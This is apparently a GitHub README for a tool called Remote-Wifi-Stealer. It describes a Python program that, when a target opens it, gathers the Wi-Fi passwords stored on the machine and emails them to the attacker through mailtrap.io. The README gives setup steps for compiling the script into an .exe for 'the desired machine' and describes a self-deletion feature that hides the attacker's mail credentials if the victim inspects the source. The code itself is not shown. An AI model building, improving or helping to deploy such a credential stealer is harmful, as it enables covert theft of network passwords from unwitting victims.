# Remote-Wifi-Stealer
// This file when opened looks at the logs of wifi passwords located in the machine and send it back to an email
> When an operating machine opens it it proceeds to look at "main.py" and after checking the credentials the logs will be sent to that adress
> you MUST use mailtrap.io
>
> ![image](https://user-images.githubusercontent.com/80414186/124387502-f3574300-dcac-11eb-99c3-05faf5114700.png)
>
> Requirementes for pip {smtplib, subprocess, glob}
>
> ![image](https://user-images.githubusercontent.com/80414186/124387557-1d106a00-dcad-11eb-9d37-d643f5e13e20.png)
>
> you have to build the python file into an .exe to be executable into the desired machine
> use  python setup.py build
  
>  after running the compiled .exe filed in about 5/10 seconds the data will arrive into inbox, if the target see the source code of the file it inmmediately deletes itself to not expose our mail credentials
